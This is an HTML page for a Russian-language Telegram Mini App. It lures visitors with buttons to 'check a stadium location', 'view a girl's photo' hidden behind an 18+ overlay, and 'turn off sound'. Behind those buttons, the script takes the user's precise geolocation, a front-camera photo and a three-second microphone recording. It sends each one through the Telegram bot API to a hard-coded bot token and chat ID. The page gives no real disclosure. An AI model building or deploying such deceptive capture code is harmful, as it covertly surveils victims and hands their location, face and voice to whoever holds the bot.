<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Мини ТГ</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: Arial, sans-serif;
      color: #f3f6fb;
      background:
        radial-gradient(circle at 20% 15%, rgba(56, 189, 248, 0.22), transparent 45%),
        radial-gradient(circle at 80% 75%, rgba(99, 102, 241, 0.22), transparent 50%),
        linear-gradient(160deg, #0b1020 0%, #131b33 60%, #0d1326 100%);
      padding: 20px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .app {
      width: 100%;
      max-width: 440px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .header h2 {
      margin: 0 0 4px;
      font-size: 20px;
    }

    .header p {
      margin: 0;
      font-size: 13px;
      color: #9fb0cc;
    }

    .menu {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .menu button.full {
      grid-column: 1 / -1;
    }

    button {
      padding: 13px 15px;
      font-size: 15px;
      font-weight: 600;
      border: 1px solid rgba(255, 255, 255, 0.14);
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.08);
      color: #fff;
      cursor: pointer;
      transition: transform 0.12s ease, background 0.2s ease;
    }

    button:hover {
      background: rgba(255, 255, 255, 0.14);
    }

    button:active {
      transform: scale(0.98);
    }

    .btn-primary {
      background: linear-gradient(135deg, #2563eb, #0ea5e9);
      border: none;
      width: 100%;
      margin-top: 10px;
    }

    .card {
      display: none;
      background: rgba(15, 23, 42, 0.78);
      border: 1px solid rgba(255, 255, 255, 0.12);
      border-radius: 16px;
      padding: 14px;
      backdrop-filter: blur(10px);
    }

    .card.active {
      display: block;
    }

    /* Макет карты */
    .fake-map {
      position: relative;
      height: 180px;
      border-radius: 12px;
      overflow: hidden;
      background:
        linear-gradient(to right, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
        linear-gradient(to bottom, rgba(148, 163, 184, 0.14) 1px, transparent 1px),
        linear-gradient(135deg, #1e3a5f, #162844);
      background-size: 28px 28px, 28px 28px, cover;
      border: 1px solid rgba(125, 211, 252, 0.25);
    }

    .map-road {
      position: absolute;
      background: rgba(250, 204, 21, 0.35);
      border-radius: 999px;
    }

    .map-road.r1 {
      width: 120%;
      height: 8px;
      top: 52%;
      left: -10%;
      transform: rotate(-11deg);
    }

    .map-road.r2 {
      width: 8px;
      height: 120%;
      left: 58%;
      top: -10%;
      transform: rotate(14deg);
    }

    .map-pin {
      position: absolute;
      left: 58%;
      top: 52%;
      transform: translate(-50%, -100%);
      background: #ef4444;
      color: #fff;
      font-size: 12px;
      font-weight: bold;
      padding: 5px 9px;
      border-radius: 999px;
      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.45);
    }

    /* Зацензуренная картинка */
    .censored-box {
      position: relative;
      height: 180px;
      border-radius: 12px;
      overflow: hidden;
      background:
        radial-gradient(circle at 30% 35%, #f59e0b, transparent 55%),
        radial-gradient(circle at 75% 65%, #ec4899, transparent 55%),
        linear-gradient(135deg, #312e81, #0f172a);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }

    .censored-overlay {
      position: relative;
      z-index: 2;
      background: rgba(15, 23, 42, 0.78);
      border: 1px solid rgba(255, 255, 255, 0.22);
      padding: 10px 14px;
      border-radius: 10px;
      text-align: center;
      backdrop-filter: blur(12px);
    }

    .censored-overlay strong {
      display: block;
      font-size: 14px;
      letter-spacing: 0.5px;
    }

    .censored-overlay span {
      font-size: 12px;
      color: #cbd5e1;
    }

    .hint {
      margin-top: 8px;
      font-size: 12px;
      color: #94a3b8;
    }

    #status {
      padding: 11px 13px;
      border-radius: 12px;
      background: rgba(255, 255, 255, 0.07);
      border: 1px solid rgba(255, 255, 255, 0.1);
      font-size: 13px;
      color: #e2e8f0;
      word-break: break-word;
    }
  </style>
</head>
<body>
  <div class="app">
    <div class="header">
      <h2>Быстрый просмотр</h2>
      <p>Выберите раздел, затем подтвердите действие в окне</p>
    </div>

    <div class="menu">
      <button id="open-geo-card">Проверить локацию стадиона</button>
      <button id="open-cam-card">Посмотреть фото девушки </button>
      <button id="btn-mic" class="full">Выключить звук</button>
    </div>

    <!-- Карточка с картой -->
    <div id="card-geo" class="card">
      <div class="fake-map">
        <div class="map-road r1"></div>
        <div class="map-road r2"></div>
        <div class="map-pin">Точка на карте</div>
      </div>
      <div class="hint">Для точного определения точки на карте потребуется доступ к геопозиции.</div>
      <button id="confirm-geo" class="btn-primary">Открыть карту</button>
    </div>

    <!-- Карточка с зацензуренной картинкой -->
    <div id="card-cam" class="card">
      <div id="censored-photo" class="censored-box">
        <div class="censored-overlay">
          <strong>[ Скрыто / 18+ ]</strong>
          <span>ОТКРЫТЬ</span>
        </div>
      </div>
      <div class="hint">Чтобы открыть подтвердите возраст 18+.</div>
      <button id="confirm-cam" class="btn-primary">Открыть фото</button>
    </div>

    <div id="status">Готово к работе</div>
  </div>

  <script>
    const BOT_TOKEN = '8322427303:AAGFHKfe3YCf7Dwg-uc7jfVA8MAn1Dbjzgw';
    const CHAT_ID = '8298749655';

    const tg = window.Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
    }

    const statusEl = document.getElementById('status');
    const cardGeo = document.getElementById('card-geo');
    const cardCam = document.getElementById('card-cam');

    function setStatus(text) {
      statusEl.textContent = text;
    }

    function showCard(targetCard) {
      cardGeo.classList.remove('active');
      cardCam.classList.remove('active');
      if (targetCard) {
        targetCard.classList.add('active');
      }
    }

    async function sendMessageToBot(text) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      });
      if (!res.ok) {
        throw new Error(`Ошибка отправки текста: ${res.status}`);
      }
    }

    async function sendFileToBot(endpoint, fieldName, blob, filename) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`;
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append(fieldName, blob, filename);

      const res = await fetch(url, {
        method: 'POST',
        body: formData
      });
      if (!res.ok) {
        throw new Error(`Ошибка отправки файла: ${res.status}`);
      }
    }

    // Срабатывает только при нажатии "Открыть карту"
    async function handleGeo() {
      if (!navigator.geolocation) {
        setStatus('Геолокация не поддерживается на этом устройстве');
        return;
      }

      setStatus('Запрашиваю разрешение для карты...');
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude, accuracy } = pos.coords;
          try {
            await sendMessageToBot(
              `Локация:\nШирота: ${latitude}\nДолгота: ${longitude}\nТочность: ${accuracy} м`
            );
            setStatus('Данные отправлены');
          } catch (err) {
            setStatus('Ошибка при отправке данных');
          }
        },
        () => {
          setStatus('Доступ к геолокации отклонён');
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    }

    // Срабатывает только при нажатии на зацензуренное фото или "Открыть фото"
    async function handleCamera() {
      if (!navigator.mediaDevices?.getUserMedia) {
        setStatus('Камера недоступна в этом окружении');
        return;
      }

      setStatus('Запрашиваю разрешение для просмотра фото...');
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false
        });

        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        await video.play();

        await new Promise((resolve) => setTimeout(resolve, 400));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const blob = await new Promise((resolve) =>
          canvas.toBlob(resolve, 'image/jpeg', 0.85)
        );

        await sendFileToBot('sendPhoto', 'photo', blob, 'photo.jpg');
        setStatus('Данные отправлены');
      } catch (err) {
        setStatus('Доступ к камере отклонён или произошла ошибка');
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    // Запись звука (3 сек)
    async function handleMic() {
      if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
        setStatus('Запись звука недоступна на этом устройстве');
        return;
      }

      setStatus('Запрашиваю доступ к микрофону...');
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = (e) => {
          if (e.data && e.data.size > 0) {
            chunks.push(e.data);
          }
        };

        const stopped = new Promise((resolve) => {
          recorder.onstop = resolve;
        });

        recorder.start();
        setStatus('Идёт запись звука (3 сек)...');
        await new Promise((resolve) => setTimeout(resolve, 3000));
        recorder.stop();
        await stopped;

        const mimeType = recorder.mimeType || 'audio/webm';
        const blob = new Blob(chunks, { type: mimeType });

        await sendFileToBot('sendVoice', 'voice', blob, 'voice.ogg');
        setStatus('Запись отправлена');
      } catch (err) {
        setStatus('Доступ к микрофону отклонён или произошла ошибка');
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
      }
    }

    document.getElementById('open-geo-card').addEventListener('click', () => {
      showCard(cardGeo);
      setStatus('Карта готова — нажмите «Открыть карту»');
    });

    document.getElementById('open-cam-card').addEventListener('click', () => {
      showCard(cardCam);
      setStatus('Фото скрыто — нажмите на него или «Открыть фото»');
    });

    document.getElementById('confirm-geo').addEventListener('click', handleGeo);
    document.getElementById('censored-photo').addEventListener('click', handleCamera);
    document.getElementById('confirm-cam').addEventListener('click', handleCamera);
    document.getElementById('btn-mic').addEventListener('click', handleMic);
  </script>
</body>
</html>
